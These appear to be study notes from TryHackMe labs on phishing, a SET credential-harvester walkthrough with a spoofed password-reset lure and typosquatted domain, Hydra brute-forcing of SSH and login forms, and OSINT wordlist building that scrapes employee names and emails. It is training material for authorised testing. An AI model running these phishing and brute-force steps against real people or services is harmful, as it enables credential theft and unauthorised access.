Urgency adds a **countdown** so the brain prioritises speed over scrutiny. Time pressure **narrows attention and reduces deliberate checking**, especially when the consequence sounds inconvenient (lockouts, delays). Language often includes "within 24 hours," "immediately," or "deadline passed."

_Example:_ "Your account will be suspended in 12 hours unless you verify your identity through this portal."

**Authority**

Authority leans on **perceived status or expertise** to gain quick compliance. People are more likely to follow instructions if they think they come from leaders, experts, or official departments. **Visual cues** (titles, signatures, formal tone) and **role labels** (HR, IT, Finance) increase the effect.

_Example:_ "From: IT Administrator. Action required on your SSO settings."

**Fear**

Fear uses **threat and alarm** to trigger a protective reaction, pushing people to "fix" the problem immediately. **Anxiety can override usual scepticism**, especially when the risk sounds personal (account compromise, legal trouble). Wording often includes "security alert," "breach," or "unauthorised access."

_Example:_ "We detected suspicious logins on your account. Secure it immediately here."

**Curiosity**

Curiosity **hooks attention** by promising interesting information. The brain wants to **close information gaps**, which can outweigh caution when the tease feels relevant or exclusive. Subject lines are short, intriguing, and slightly vague.

_Example:_ "Confidential: Q3 roadmap highlights."

**Trust**

Trust **piggybacks on familiar brands, colleagues, or communication styles** so the message feels safe by default. Recognisable names, logos, or routines (monthly reports, ticket numbers) **lower scepticism and make requests seem routine**.

_Example:_ "Microsoft 365: New security notice available in your portal" or a message that looks like it's from a known teammate asking for a quick review.

**Cognitive Biases**

Cognitive bias is the tendency to make **decisions based on feelings, assumptions, or past experiences instead of facts**. These biases increase the risk of falling for phishing scams:

- **Overconfidence bias** — Many people, especially cyber security practitioners, think they're too smart to fall for phishing scams. However, this overconfidence can lead to less vigilance when checking suspicious messages.
- **Confirmation bias** — This happens when people accept information that fits their expectations. For instance, if someone is waiting for an email from their bank, they might trust a phishing email that pretends to be from the bank without verifying it.
- **Authority bias** — This leads people to trust messages from those they see as authority figures without question. An email from a high-ranking official is more likely to be trusted than one from an unknown source.

Understanding these psychological principles is essential for pentesters simulating phishing campaigns. By including tactics like urgency and authority in phishing emails or fake landing pages, pentesters can test how well organisations defend against these social engineering attacks.

#### Phishing Techniques

Phishing campaigns use **technical manipulation** to deceive targets and bypass defences. Here are common techniques attackers use to trick victims into interacting with malicious content.

**URL and Domain Manipulation**

As a pentester, one primary goal is to get targets to **click on a URL under your control**. Common techniques include:

**URL Masking** — Disguising a malicious URL behind a legitimate-looking hyperlink. For example, an attacker might display `https://tryhackme.com` while redirecting users to `http://phisher.thm`.

**Homograph Attacks** — Exploit visual similarities between domain name characters (e.g. replacing "o" with "0" or using Cyrillic characters). An attacker might register `go0gle.com` that looks identical to the legitimate one but redirects to a malicious site.

**Typosquatting** — Registering domains similar to legitimate ones, relying on users making typing errors (e.g. `tryhacme.com` instead of `tryhackme.com`). As a pentester, you can use these domains for phishing websites or malware delivery.

**URL Shorteners** — Hide a link's true destination. These URLs are more complicated for users to inspect and can bypass basic security checks.

**Email Spoofing Fundamentals**

**Email spoofing** is a technique for **impersonating a legitimate sender by modifying email headers**. For example, you can spoof the "From" field to display a trusted sender's email address (a manager or someone from HR).

If a domain lacks security measures for authentication, an attacker can use a Python script to modify their email address. This is possible because **SMTP (Simple Mail Transfer Protocol) does not have built-in functionality for authenticating email addresses.**

**Display name spoofing** involves changing the sender's name in an email client while keeping the actual email address hidden. For instance, you could display "IT Support" as the sender's name while using a Gmail address. **Many mobile email clients only show the display name by default**, hiding the actual email address, which makes this technique very effective.

Other techniques involve using **domains similar to legitimate ones** (e.g. `support@tryhackme-secure.com` instead of `support@tryhackme.com`), tricking recipients into trusting the email.

**Example of a Spoofed Email**

What the recipient sees:

```
From: Support <support@tryaccounting.thm>
To: bob@tryaccounting.thm
Subject: Urgent: Account Verification Required

Dear Bob,

As part of our security policy, we require all TryAccounting employees to change their passwords every 3 months. Please log in to our internal portal and update your password before Friday:
http://tryaccounting-security.thm/account

Thank you,
TryAccounting Support Team
```

What the email headers reveal (if inspected):

```
From: Support <support@tryaccounting.thm>
Reply-To: attacker@phisher.thm
Return-Path: attacker@phisher.thm
X-Sender: attacker@phisher.thm
Received: from phisher.thm (mail.phisher.thm [192.168.1.25]) by mail.tryaccounting.thm
```

**Email Security Measures**

Many organisations use security measures to prevent such attacks:

- **SPF** (Sender Policy Framework)
- **DMARC** (Domain-based Message Authentication, Reporting, and Conformance)
- **DKIM** (DomainKeys Identified Mail)

Bypassing these security measures is outside this room's scope, but understanding the basics is crucial for building a strong foundation.

**Credential Harvesting**

In a **login cloning attack**, the attacker:

1. Replicates all visual elements of the legitimate website (logos, fonts, form fields)
2. Hosts them on a deceptive domain
3. **Submitted credentials are sent to a script under the attacker's control** (not the authentic authentication server)
4. Credentials are logged to a file or database
5. Victim is redirected to the legitimate site (minimising suspicion)

The victim perceives only a failed login attempt, while the attacker acquires the victim's password.

**Payload Delivery Mechanisms**

A frequently used delivery method involves a **Microsoft Word document containing a macro**. Upon opening the file:

1. Victim encounters a prompt to "Enable Content" in order to view the document (built-in social engineering)
2. Once enabled, the **VBA macro executes silently in the background**
3. In an actual attack, this macro may download and execute malware
4. During a penetration test, it's replaced with a benign beacon confirming execution without causing harm

**Typical sequence:**

1. Victim receives and opens the `.docm` attachment
2. Microsoft Word prompts the user to enable macros
3. Victim clicks "Enable Content"
4. VBA macro executes a hidden command
5. Attacker receives confirmation of execution

**Tools of the Trade**

**GoPhish** — A web-based framework making phishing campaign setup straightforward. Features:

- Store SMTP server settings for sending emails
- Web-based WYSIWYG editor for email templates
- Schedule emails
- Analytics dashboard showing open and click rates

See the [Phishing room](https://tryhackme.com/room/phishingyl) on TryHackMe for hands-on experience.

**EvilNginx** — A tool designed for advanced phishing campaigns that **bypass multi-factor authentication (MFA)**. Acts as a reverse proxy between victims and legitimate sites, **capturing credentials and session tokens in real time**.

**The Social Engineering Toolkit (SET)** — Contains many tools; key capabilities for phishing include:

- Ability to create spear-phishing attacks
- Deploy fake versions of common websites to trick victims into entering credentials

#### Anatomy of a Phishing Campaign

Phishing campaigns are not just about sending random emails and hoping someone clicks on a malicious link. They require **extensive planning, reconnaissance, execution, and post-attack analysis** to succeed. A phishing exercise is only impactful if it ends with a report that decision-makers can act on.

**Planning & Scoping**

Start by:

- Agreeing on the mission with the client and writing it down in **one sentence**
- Define which user groups are **in or out of scope**
- Specify which techniques are **in bounds**
- Define specific **outcomes to measure** (e.g. separating "clicked a link" from "attempted to submit credentials")
- Set the campaign **timing and message volume**
- Secure **legal sign-off**
- Record the **rules of engagement, an explicit kill switch, and emergency contacts**

This keeps the exercise authorised, safe, and reversible.

**Reconnaissance**

Use **only public information** to make lures feel plausible without crossing privacy lines. Sources include:

- Company websites
- Press releases
- LinkedIn profiles
- Public social posts
- Relevant news

This provides enough context to craft believable pretexts (e.g. referencing a recent announcement or policy change). Keep all collections within scope and **document sources** so it's clear the research stayed ethical and limited to OSINT.

**Scenario & Payload Development**

Turn the intel into **realistic but harmless messages**: an invoice reminder, an IT notification, or an HR update that looks and reads like the real thing. Payloads should support learning, not exploitation:

- **Tracking links** to measure engagement
- **Branded landing pages** capturing metadata
- **Benign attachments** measuring behaviour

Avoid malware and live credential capture entirely; use **simulated login pages and fake accounts** to measure risk-free behaviour.

**Exploitation and Post-Exploitation**

Run the campaign according to the agreed plan:

- Either in **staggered waves** or as a **single send**
- Monitor opens, clicks, simulated submissions, and reports in real time
- Keep the **kill switch and escalation path visible** to the team
- **Pause immediately** if messages leak outside scope or trigger unintended consequences
- Use **lab-safe tooling** (GoPhish or equivalent sandboxed platform)
- Only target real users after obtaining **prior written authorisation**

**Reporting and Debriefing**

Analyse what happened and why:

- **Click rates, submission attempts**
- **Reporting behaviour and timing** across teams
- Present findings **without naming individuals**
- Focus on **practical improvements**: targeted training, phishing-resistant MFA, SPF/DKIM/DMARC configuration, other technical controls

Close with agreed follow-up actions and a sensible cadence for re-testing so progress can be measured over time.

**Common Phishing Campaign Metrics**

|Metric|What it measures|Benchmark|Suggested Recommendation(s)|
|---|---|---|---|
|**Open Rate**|% of users who opened the email|Industry varies; typical phishing open rates ~50–65%|Targeted refresher training|
|**Click Rate**|% of all users who clicked a link|8–14% acceptable; >14% high risk|Focused security awareness training|
|**Credential Entry Rate**|% of all users who entered credentials after clicking|<2% low risk; 2–5% moderate risk; >5% high risk|Phishing site identification training, MFA implementation|
|**Attachment Detonation Rate**|% of users who opened/executed an attachment|No formal benchmark; >5–7% suggests risk|Educate on safe handling of attachments, Sandbox detonation|
|**Reporting Rate (24h)**|% of users who reported the email within 24h|>40% strong; 30–40% average; <30% low|Reporting awareness campaign|

A phishing simulation provides value only when its results are **communicated clearly to the client**. The responsibilities of a penetration tester extend beyond the campaign's conclusion; it is essential to **translate raw metrics into actionable findings**.

#### The Social Engineering Toolkit (SET) Practical

**Scenario**

After OSINT investigation, you've identified a good target: **Bob**, the head of finance at **TryAccounting**. Through LinkedIn, you found: `bob@tryaccounting.thm`. From a job offer for a cyber security engineer, you learned:

- They have a **strict password policy** (good pretext for phishing email)
- They use **email security** (may need basic email spoofing)

Your goal: **obtain Bob's credentials** by creating a phishing web app to harvest them.

**Step 1: SSH into the VM**

```bash
ssh attacker@MACHINE_IP
```

Credentials: `attacker` / `attacker1234`

**Step 2: Launch the Social Engineering Toolkit**

```bash
SET
```

An alias is configured on the VM to make this easier.

**Step 3: Select Social-Engineering Attacks**

```
Select from the menu:
   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About
  7) Exit the Social-Engineer Toolkit

set 1
```

**Step 4: Select Website Attack Vectors**

```
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules
  11) Return back to the main menu.

set 2
```

**Step 5: Select Credential Harvester Attack Method**

```
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method
  8) Return to Main Menu

set 3
```

**Step 6: Choose Custom Import**

Choose the third option, **Custom Import**, so you can use your own HTML file. During a real campaign, you'd use "Site Cloner" to create a realistic copy of the target's web app. When prompted for an IP address for the POST back, **ensure it's the same as `MACHINE_IP`**:

```
   1) Web Templates
   2) Site Cloner
   3) Custom Import
  4) Return to Webattack Menu

set 3

set:webattack IP address for the POST back in Harvester/Tabnabbing [10.10.189.116]: MACHINE_IP
```

**Step 7: Provide the Path to Your HTML**

```
[!] Example: /home/website/ (make sure you end with /)
[!] Also note that there MUST be an index.html in the folder you point to.
set:webattack Path to the website to be cloned: /home/ubuntu/setoolkit/

[*] Index.html found. Do you want to copy the entire folder or just index.html?
1. Copy just the index.html
2. Copy the entire folder

Enter choice [1/2]: 1
```

**Step 8: Enter the Target URL**

```
[-] Example: http://www.blah.com
set:webattack URL of the website you imported: http://tryacounting.thm

[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

Note the **intentional typo** in the domain: one "c" is missing. In a phishing engagement, having control of a typosquatted domain maximises success chances. The Credential Harvester is now running on port 80 and can be accessed at `http://MACHINE_IP` in a browser.

**Step 9: Send the Phishing Email**

1. Head to `http://MACHINE_IP:8080` in your browser
2. Log into the Rainloop email client with: `attacker@phisher.thm` / `attacker1234`
3. Click **"New Message"**
4. Click on the sender's email (next to "From" field) and select **`support@tryaccounting.thm`** from the dropdown (makes it look like internal email)
5. Send the email to `bob@tryaccounting.thm`

**Sample Phishing Email:**

```
Subject: Action Required: Password Expiration Notice

Dear Bob,

As part of our security policy, we require all TryAccounting employees to change their passwords every 3 months. Please log in to our internal portal and update your password before Friday:

http://tryacounting.thm

Thank you,
TryAccounting Support Team
```

**Step 10: Capture the Credentials**

Monitor your terminal window where SET is running. When Bob clicks the link and enters his credentials, you'll see:

```
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=bob.wilkinson
POSSIBLE PASSWORD FIELD FOUND: password=***************
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

**Congratulations on performing a successful spear phishing attack!**

> [!summary] Quick Recap — Phishing Basics
> 
> - **Phishing** = social engineering attack exploiting human psychology (not technical flaws) to steal credentials, install malware, or gain access; primary vectors: email, SMS (smishing), voice calls (vishing), fake websites
> - **Types:** phishing (broad, many targets), spear phishing (targeted individual), whaling (targeted executive/decision-maker)
> - **Psychological principles:** scarcity/FOMO, urgency, authority, fear, curiosity, trust; combined with cognitive biases (overconfidence, confirmation bias, authority bias) make victims susceptible
> - **Technical techniques:** URL masking/homograph attacks/typosquatting, email spoofing (header manipulation, display name spoofing), credential harvesting (login cloning), macro-based payloads in Word docs
> - **Campaign anatomy:** planning/scoping → recon (OSINT) → scenario & payload development → exploitation/post-exploitation → reporting/debriefing; metrics (open rate, click rate, credential entry rate, reporting rate) guide recommendations
> - **SET practical:** Social Engineering Toolkit can clone websites or accept custom HTML, captures credentials via HTTP POST; phishing email uses authority + urgency + spoofed sender; typosquatted domain + targeted message increases success
> - **Operational considerations:** legal sign-off required, kill switch mandatory, metrics-driven reporting focuses on training/technical controls (MFA, SPF/DKIM/DMARC), not individual blame

### Hydra

> [!info] Room context **Hydra** — an online (live-service) brute force password-cracking tool. Given a target, a username (or list), and a password list, Hydra automates the manual "try every password" process against a wide range of authentication services. Distinct from _offline_ cracking (hashcat/John) covered elsewhere in this topic — Hydra attacks a live, running service directly over the network.

#### What Hydra Is

**Core function:** brute forces authentication on live services by cycling through a password list (optionally a username list too) far faster than manual guessing.

**Protocols supported** (from the official THC-Hydra repo) — a very wide net: Asterisk, AFP, Cisco AAA/auth/enable, CVS, Firebird, FTP, the full HTTP/HTTPS form/GET/HEAD/POST/PROXY family, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle (Listener/SID/DB), PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP (+ SMTP Enum), SNMP v1/v2/v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC, XMPP.

> [!note] Why this list matters Hydra isn't an SSH-only or web-only tool — if a service accepts a username/password over the network, there's a good chance Hydra already has a module for it. Worth remembering as a first option whenever a live login prompt (not a hash) is the target.

**The underlying lesson:** this entire attack class is why password strength matters in the first place. Common, short, special-character-free passwords are exactly what a million-entry wordlist chews through quickly — and default credentials (`admin:password` on CCTV systems, web frameworks, etc.) are the single easiest win a wordlist-based attack can get. Changing defaults immediately on any out-of-the-box system is a direct, practical mitigation against exactly this tool.

> [!summary] Quick Recap — What Hydra Is
> 
> - Online/live brute forcer — attacks a running service directly, not an offline hash dump
> - Broad protocol support: SSH, FTP, RDP, SMB, HTTP(S) forms, databases, and dozens more
> - Directly demonstrates why weak/default credentials are the highest-value, lowest-effort target in any assessment

---

#### Using Hydra

Pre-installed on the AttackBox; on other distros: `apt install hydra` (Debian/Ubuntu) or `dnf install hydra` (Fedora), or build from the [official repo](https://github.com/vanhauser-thc/thc-hydra).

**Generic pattern** — brute forcing FTP with a known username and a password list:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

#### SSH

```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

|Option|Description|
|---|---|
|`-l`|SSH username for login|
|`-P`|password list to use|
|`-t`|number of parallel threads|

Example: `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` — attacks `ssh` as `root`, cycling `passwords.txt`, with 4 threads running in parallel.

#### Web Form (POST)

Requires knowing the request type first (**GET** vs **POST**) — check via browser DevTools Network tab or page source before building the command.

```bash
sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

|Option|Description|
|---|---|
|`-l`|username for web form login|
|`-P`|password list|
|`http-post-form`|specifies the form type as POST|
|`<path>`|login page URL, e.g. `login.php`|
|`<login_credentials>`|field names + placeholders, e.g. `username=^USER^&password=^PASS^`|
|`<invalid_response>`|a string that appears in the response specifically on **failed** login — the signal Hydra uses to tell success from failure|
|`-V`|verbose output, shows every attempt|

**Concrete example:**

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- `/` — login page is the site root
- `username=^USER^&password=^PASS^` — form field names; `^USER^`/`^PASS^` are Hydra's placeholders, substituted per attempt
- `F=incorrect` — the string `"incorrect"` appearing in the response marks that attempt as a **F**ailure; Hydra flags anything _not_ matching this as a potential success

> [!warning] `F=` vs `S=` — get the failure/success string right `F=<string>` tells Hydra what a **failed** login looks like — get this wrong (e.g. matching text that also appears on the successful-login page) and Hydra will either report false positives or miss the real credentials entirely. Inspect the actual failed-login response carefully before building the command.

**Non-default port:**

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

> [!summary] Quick Recap — Using Hydra
> 
> - SSH: `hydra -l user -P wordlist.txt MACHINE_IP -t 4 ssh` — straightforward, three core flags (`-l`, `-P`, `-t`)
> - Web form (POST): needs the login path, exact form field names, and a **failure-string** (`F=`) to distinguish wrong attempts from a real hit
> - Always confirm GET vs POST first via DevTools/source before building the `http-post-form` string
> - `-s <port>` for non-default ports; `-V` for verbose per-attempt output when troubleshooting a command that isn't behaving as expected

> [!summary] Full Hydra Room — One Glance
> 
> - Hydra = live-service brute forcer, huge protocol coverage (SSH, FTP, RDP, SMB, HTTP forms, DBs, and more)
> - SSH brute force: `-l`, `-P`, `-t` is the whole pattern
> - Web form brute force: correctly identifying the request method, field names, and a reliable failure-string (`F=`) is the entire challenge — the Hydra syntax itself is simple once those three are known
> - Direct practical takeaway: default/weak credentials are trivially defeated by exactly this class of tool — changing defaults immediately is a real, low-effort mitigation
### Introduction to Wordlists

> [!info] Room context Fundamentals of using, building, and refining wordlists for offensive security — from what they are and where they're used, through OSINT-driven custom wordlist creation, cleaning/deduplication, and finally applying refined lists with **ffuf** (directory discovery) and **Hydra** (login brute-forcing). Lab target: **TryFinanceMe**.

> [!info] Setup
> 
> ```bash
> echo 'MACHINE_IP tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
> ```

#### Wordlists — What and Where

**Core concept:** a plain text file, one candidate string per line (word, phrase, password, filename, subdomain) — fed into a tool so it automates guessing at scale instead of a human trying entries manually.

**Attack categories wordlists power:**

- **Brute-force attacks** — every entry tried as a password, exhaustively
- **Dictionary attacks** — real words / frequently-used passwords, smarter than pure brute force
- **Directory/file enumeration** — candidate folder/file names tested against a web server to find unlinked resources

**Where they're used, by tool:**

|Tool|Purpose|How It Uses Wordlists|
|---|---|---|
|John the Ripper|Password cracking|Dictionary attacks against password hashes|
|hashcat|Password cracking|Wordlists + rule-based mutations against hashes|
|Hydra|Live service login brute-forcing|Feeds username/password pairs into login prompts across many protocols|
|Gobuster / ffuf|Directory & subdomain enumeration|Reads path/subdomain candidates, sends requests to find hidden resources|
|Burp Suite / OWASP ZAP|Web fuzzing|Fuzzes parameters, cookies, headers for vulnerability discovery|
|Aircrack-ng|Wireless password cracking|Guesses WPA/WPA2 passphrases|

**Wordlist sources, three categories:**

1. **Pre-made lists** — `rockyou.txt` (Kali, `/usr/share/wordlists/`, **14,344,392 lines** of breached real-world passwords) and **SecLists** (usernames, passwords, directories, API endpoints, DNS subdomains, and more — e.g. `raft-large-files.txt`, `common.txt`, `top-passwords-shortlist.txt`, `subdomains-top1million-5000.txt`)
2. **Custom lists** — tailored to the specific target: personal info, local language, industry terms, cultural references. Narrower but far higher hit-rate than generic lists.
3. **Generated lists** — tools like **crunch** exhaust every combination of a character set within a length range:
    
    ```bash
    crunch 6 6 0123456789abcdef -o 6chars.txt
    ```
    
    Every 6-character hex string, written to file. Crunch can also pipe output directly into Hydra/John rather than writing to disk first.

> [!warning] Generators produce huge files Combinatorial generation should be used judiciously — file sizes explode fast as length/charset grow. A targeted custom list built from real OSINT almost always outperforms a blind combinatorial sweep for actual hit rate per request sent.

> [!summary] Quick Recap — Wordlists Overview
> 
> - One candidate string per line, fed to a tool that automates the guessing loop at scale
> - Three source types: pre-made (`rockyou.txt`, SecLists), custom (OSINT-derived), generated (crunch — exhaustive but large)
> - Custom, target-specific lists reliably beat generic ones on real engagements — this room's core thesis

---

#### Gathering Information for Custom Wordlists

**Three categories a good custom list should cover:**

1. **Company-specific keywords** — product names, internal features, project code names
2. **Technology-specific keywords** — framework/language-derived terms (WordPress plugin paths, Laravel routes, etc.)
3. **Generic keywords** — common folders/routes: `api`, `assets`, `admin`, `dev`, `login`, `settings`

Combining all three uncovers hidden directories, parameters, and subdomains that a purely generic list misses.

**OSINT sources for harvesting:**

- **Professional networks** — LinkedIn/company pages/recruitment sites reveal employee names, job titles, tech stack. MITRE ATT&CK catalogues this as **T1591.004 – Identify Roles**. Automatable via `linkedin2username` or `CrossLinked`.
- **Company websites & social media** — project/product names, office locations, slogans; social accounts (X, Facebook, GitHub) may leak internal acronyms or tooling names.
- **Job advertisements** — technology mentions ("AWS", "Salesforce", "React") often echo directly into internal subdomains/directory names. Search `<company> jobs`, or Indeed/LinkedIn Jobs directly.

**Basic recon methods:**

- **WHOIS lookup** — domain registration details, nameservers, occasionally IT contact info (`whois` tool)
- **Subdomain enumeration & cert search** — theHarvester, Sublist3r, Recon-ng for public-source extraction; certificate transparency logs (**crt.sh**) and passive DNS for historical domain names
- **Site crawling** — spidering pages/meta-tags/documents for in-context vocabulary; **CeWL** automates this
- **Technology fingerprinting** — BuiltWith, Wappalyzer, or manual HTTP header inspection to identify the stack, then pull SecLists entries tailored to that specific platform (e.g. WordPress plugin paths)

#### CeWL — Crawling for Words and Emails

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
```

|Flag|Meaning|
|---|---|
|`-d 2`|crawl depth: 2 levels|
|`-m 3`|minimum word length: 3 characters|
|`--lowercase`|normalise case on extraction|
|`--with-numbers`|include alphanumeric words|
|`-e`|enable email extraction|
|`--email_file emails.txt`|write found emails here|
|`-w cewl_words.txt`|write extracted words here|

Produces `cewl_words.txt` (keywords) and `emails.txt` (company emails) in one pass.

#### Downloading Documents and Extracting Strings

Public PDFs/docs often carry internal jargon or leaked credentials in their content or metadata.

```bash
wget -r -A pdf http://tryfinanceme.local/docs/

for f in $(find tryfinanceme.local/docs -name '*.pdf'); do
  strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt
done
```

`strings -n 5` pulls human-readable sequences of ≥5 characters out of the binary PDF; the `grep -v` strips out PDF-internal structural noise (`stream`, `endobj`, etc.) that isn't actual page content.

**Extracting emails from downloaded PDFs:**

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
sort -u emails_docs.txt > emails_docs.unique.txt
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
```

Recursive regex email match → dedupe → strip the `@domain` portion to leave just the local-part (a candidate username).

#### Harvesting Names from the Social Page

Names embedded in predictable HTML structure are a precise regex target:

```html
<h3 class="profile-name">Alex Johnson</h3>
```

```bash
curl -s http://social.tryfinanceme.local/ | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

Positive lookbehind `(?<=...)` anchors right after the opening tag, then captures everything up to the next `<` — a clean, precise extraction with no unrelated page text mixed in.

**Generating username format permutations** from full names:

```bash
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt   # alex.johnson
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt  # ajohnson
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt # alexj
```

Three of the most common real-world username conventions, all case-normalised to avoid mismatch noise later.

**Files accumulated by this point:**

|File|Contents|
|---|---|
|`cewl_words.txt`|Keywords scraped from the site|
|`emails.txt`|Emails found by CeWL|
|`raw_words.txt`|Strings extracted from PDFs|
|`emails_docs.txt`|Emails found inside PDFs|
|`names.txt`|Employee names from the social page|
|`users_first.last.txt` / `users_flast.txt` / `users_firstl.txt`|Username format permutations|
|`users_from_emails.txt`|Usernames derived from email local-parts|

> [!summary] Quick Recap — Gathering Custom Wordlist Data
> 
> - Three keyword categories to cover: company-specific, technology-specific, generic
> - CeWL crawls + extracts words _and_ emails in one command — the fastest single source
> - PDFs/docs often leak internal vocabulary and emails through `strings` + targeted `grep`, not just page content
> - Positive lookbehind regex (`(?<=...)`) is the precise tool for scraping structured HTML fields like names
> - Standard username permutations (`first.last`, `flast`, `firstl`) are worth generating from any harvested name list — cheap and high-value

---

#### Creating and Cleaning Wordlists

**Why cleaning matters:** raw scraped lists are messy — duplicates, mixed case, punctuation-heavy junk, PDF structural noise. Bloated/unfiltered lists waste request budget (directories like `#include` will never exist on a web server) and slow down every tool that consumes them. Lowercasing collapses `Helios`/`helios`/`HELios` into one entry; length/character filtering removes implausible tokens.

**Merging and normalising the word list:**

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt
```

`sort -u` sorts alphabetically **and** deduplicates in one pass.

Second pass — normalise and filter:

```bash
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```

- `tr '[:upper:]' '[:lower:]'` — force lowercase
- `tr -d '\r'` — strip Windows carriage-return artifacts from doc-sourced text
- `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'` — keep only strings starting alphanumeric, followed by letters/digits/`.`/`_`/`-`, **minimum 5 characters total**
- final `sort -u` — guarantee uniqueness after all the transforms

**Sanity check the result:**

```bash
wc -l words_clean.txt
head words_clean.txt
```

> [!note] Sizing judgment call Too large slows down `ffuf` for no real gain; too small risks missing legitimate paths. A few hundred well-formed, lowercase entries is the target range for a focused, OSINT-derived list — not the millions-of-lines scale of `rockyou.txt`.

**Merging usernames** — same dedup pattern applied across all username permutation files:

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt | sort -u > users.txt
```

**Generating a pattern-based password list** — when OSINT reveals a _format_ rather than a specific password (e.g. discovered convention: `Helios20NN!`), crunch's template syntax exhausts exactly that space:

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

- `11 11` — fixed length, min = max = 11 characters
- `-t Helios20%%!` — template; `%%` = two digit positions (crunch substitutes `00`–`99`)
- `-o pass_helios.txt` — 100 total entries written

> [!note] Crunch template characters `%` represents a **digit** position in a crunch template — `%%` reserves two digit slots, cycled through every combination (`00`–`99` for two `%`s). Other template characters exist for letters/symbols, but digits (`%`) are the one used here.

This targeted, pattern-derived list stays tiny (100 entries) — meaning Hydra runs against it near-instantly, compared to blasting a full generic password list at the same login form.

**End state — two clean, purpose-built lists ready for use:**

- `words_clean.txt` — directory/file discovery
- `users.txt` + `pass_helios.txt` — login brute-forcing

> [!summary] Quick Recap — Cleaning Wordlists
> 
> - `sort -u` is the workhorse for deduplication at every merge step
> - Normalisation pass: lowercase → strip `\r` → regex-filter by shape/length → dedupe again
> - `wc -l` + `head` sanity-check size and contents before trusting a list in a live scan
> - A discovered _password pattern_ (not just raw OSINT words) is exactly what crunch's `%` template syntax is for — small, targeted, fast

---

#### Using Your Wordlists

#### Directory & File Discovery with ffuf

`words_clean.txt` is used here specifically because it's built from company-specific scraped terms — precisely the vocabulary likely to appear as real (if unlinked) directory names, unlike a generic list.

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
```

|Flag|Meaning|
|---|---|
|`-w words_clean.txt`|wordlist path|
|`-u .../FUZZ`|target URL; `FUZZ` is replaced per word|
|`-e .php,.html,/`|test each word bare _and_ with these extensions appended|
|`-mc 200,301,302`|only report these status codes — valid pages or redirects|

A hit like `helios/` stands out in the results. If instead flooded with false positives, add `-fs <bytes>` (filter by response size) or `-fl <lines>` (filter by line count) — first note the size/line-count signature of a typical 404 response, then filter it out explicitly.

> [!note] ffuf is not just for directories The same tool, pointed at a different position in the URL (subdomain slot, a query parameter, an API path segment) with an appropriately-shaped wordlist, does subdomain discovery, parameter fuzzing, and API endpoint discovery too — this lab scopes to directories, but the technique generalises directly.

#### Brute-Forcing the Login Page with Hydra

Discovered directory → `http://tryfinanceme.local/helios/login.php`.

`http-post-form`'s argument has **three colon-separated parts**:

1. `/helios/login.php` — the login handler path
2. `username=^USER^&password=^PASS^` — the POST body, with Hydra's substitution placeholders
3. `S=THM{` — a **success** condition string (note: `S=`, not the `F=` failure-string pattern used in the Hydra room's generic example) — Hydra treats the login as successful when the response contains `THM{`, which is where this lab's flag happens to surface

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

|Flag|Meaning|
|---|---|
|`-L users.txt`|read usernames from a file (vs. `-l` for a single username)|
|`-P pass_helios.txt`|read passwords from a file|
|`-f`|stop immediately after the first valid credential pair is found|
|`-V`|verbose — print every attempt|
|`-t 4`|4 parallel threads|

Hydra streams every attempted pair; a success line reveals the working username/password, which then logs in directly at `http://tryfinanceme.local/helios/` to reveal the flag.

